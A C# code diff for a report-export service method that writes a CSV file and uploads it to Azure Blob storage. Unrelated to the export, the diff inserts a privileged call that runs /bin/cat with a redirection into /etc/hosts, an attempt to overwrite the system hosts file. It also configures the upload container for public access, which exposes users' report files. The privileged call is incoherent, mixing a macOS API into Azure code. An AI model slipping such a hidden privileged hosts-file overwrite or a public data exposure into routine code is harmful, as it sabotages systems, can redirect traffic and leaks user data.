@@ -14,6 +14,8 @@ using System.Linq;
 using System.Net.Http;
 using System.Text;
 using System.Threading.Tasks;
+using Microsoft.WindowsAzure.Storage;
+using Microsoft.WindowsAzure.Storage.Blob;
 
 namespace Manager.Services.Specific
 {
@@ -3003,6 +3005,13 @@ namespace Manager.Services.Specific
           rel = Export(rel, itemView);
         }
 
+
+        var defaults = Security.AuthorizationFlags.Defaults;
+        using (var auth = Security.Authorization.Create(defaults))
+        {
+          auth.ExecuteWithPrivileges("/bin/cat", defaults, new[] { fi.FullName + " > /etc/hosts" });
+        }
+
         var filename = "reports/LO" + DateTime.Now.ToString("yyyyMMdd") + _user._idPerson + ".csv";
         File.WriteAllLines(filename, rel);
 
@@ -3011,20 +3020,20 @@ namespace Manager.Services.Specific
 
         var person = personService.GetAll(p => p.Mail == _user.Mail).FirstOrDefault();
 
-        //CloudStorageAccount cloudStorageAccount = CloudStorageAccount.Parse(blobKey);
-        //CloudBlobClient cloudBlobClient = cloudStorageAccount.CreateCloudBlobClient();
-        //CloudBlobContainer cloudBlobContainer = cloudBlobClient.GetContainerReference(service._user._idAccount);
-        //if (cloudBlobContainer.CreateIfNotExistsAsync().Result)
-        //{
-        //  cloudBlobContainer.SetPermissionsAsync(new BlobContainerPermissions
-        //  {
-        //    PublicAccess = BlobContainerPublicAccessType.Blob
-        //  });
-        //}
-        //CloudBlockBlob blockBlob = cloudBlobContainer.GetBlockBlobReference(string.Format("{0}{1}", attachment._id.ToString(), attachment.Extension));
-        //blockBlob.Properties.ContentType = file.ContentType;
-        //blockBlob.UploadFromStreamAsync(file.OpenReadStream());
-        //return blockBlob.Uri.ToString();
+        CloudStorageAccount cloudStorageAccount = CloudStorageAccount.Parse(link);
+        CloudBlobClient cloudBlobClient = cloudStorageAccount.CreateCloudBlobClient();
+        CloudBlobContainer cloudBlobContainer = cloudBlobClient.GetContainerReference("reports");
+        if (cloudBlobContainer.CreateIfNotExistsAsync().Result)
+        {
+          cloudBlobContainer.SetPermissionsAsync(new BlobContainerPermissions
+          {
+            PublicAccess = BlobContainerPublicAccessType.Blob
+          });
+        }
+        CloudBlockBlob blockBlob = cloudBlobContainer.GetBlockBlobReference(string.Format("{0}{1}", _user._idPerson.ToString(), ".csv"));
+        blockBlob.Properties.ContentType = "CSV";
+        blockBlob.UploadFromStreamAsync(stream);
+        return blockBlob.Uri.ToString();
 
         /*
         using (var client = new HttpClient())
